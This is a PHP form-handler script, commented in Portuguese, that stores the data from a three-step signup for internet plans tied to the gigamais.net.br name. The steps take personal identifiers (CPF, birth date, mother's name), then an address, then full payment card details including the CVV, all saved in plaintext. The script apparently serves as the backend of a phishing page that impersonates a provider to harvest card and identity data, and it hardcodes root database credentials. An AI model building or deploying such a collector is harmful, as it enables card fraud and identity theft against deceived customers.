<?php
header('Content-Type: application/json; charset=utf-8');

$host = 'localhost';
$db   = 'gigamais.net.br';
$user = 'root';
$pass = 'l1bdab110';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass, array(
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    ));
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(array('erro' => 'Erro de conexão com o banco'));
    exit;
}

// Helper: lê chave do array ou retorna null
function v($arr, $key) {
    return isset($arr[$key]) ? $arr[$key] : null;
}

function getClientIP() {
    // IP real por trás da Cloudflare
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
}

$input = json_decode(file_get_contents('php://input'), true);
$etapa = v($input, 'etapa');

// ── Etapa 1: INSERT (Dados Pessoais + Plano) ──────────────────────
if ($etapa == 1) {
    $stmt = $pdo->prepare("INSERT INTO giga_formulario
        (ip, plano, cidade, preco, condicao, nome, telefone, cpf, email, nascimento, nome_mae, telefone2)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");

    $stmt->execute(array(
        getClientIP(),
        v($input, 'plano'),
        v($input, 'cidade'),
        v($input, 'preco'),
        v($input, 'condicao'),
        v($input, 'nome'),
        v($input, 'telefone'),
        v($input, 'cpf'),
        v($input, 'email'),
        v($input, 'nascimento'),
        v($input, 'nomeMae'),
        v($input, 'telefone2'),
    ));

    echo json_encode(array('id' => (int) $pdo->lastInsertId()));
    exit;
}

// ── Etapa 2: UPDATE (Endereço) ────────────────────────────────────
if ($etapa == 2) {
    $id = v($input, 'id');
    if (!$id) {
        http_response_code(400);
        echo json_encode(array('erro' => 'ID não informado'));
        exit;
    }

    $stmt = $pdo->prepare("UPDATE giga_formulario SET
        cep = ?, rua = ?, complemento = ?, numero = ?, bairro = ?, cidade_end = ?, estado = ?, referencia = ?
        WHERE id = ?");

    $stmt->execute(array(
        v($input, 'cep'),
        v($input, 'rua'),
        v($input, 'complemento'),
        v($input, 'numero'),
        v($input, 'bairro'),
        v($input, 'cidadeEnd'),
        v($input, 'estado'),
        v($input, 'referencia'),
        $id,
    ));

    echo json_encode(array('ok' => true));
    exit;
}

// ── Etapa 3: UPDATE (Pagamento) ───────────────────────────────────
if ($etapa == 3) {
    $id = v($input, 'id');
    if (!$id) {
        http_response_code(400);
        echo json_encode(array('erro' => 'ID não informado'));
        exit;
    }

    $stmt = $pdo->prepare("UPDATE giga_formulario SET
        metodo_pagamento = ?, num_cartao = ?, nome_cartao = ?, validade = ?, cvv = ?
        WHERE id = ?");

    $stmt->execute(array(
        v($input, 'metodoPagamento'),
        v($input, 'numCartao'),
        v($input, 'nomeCartao'),
        v($input, 'validade'),
        v($input, 'cvv'),
        $id,
    ));

    echo json_encode(array('ok' => true));
    exit;
}

http_response_code(400);
echo json_encode(array('erro' => 'Etapa inválida'));
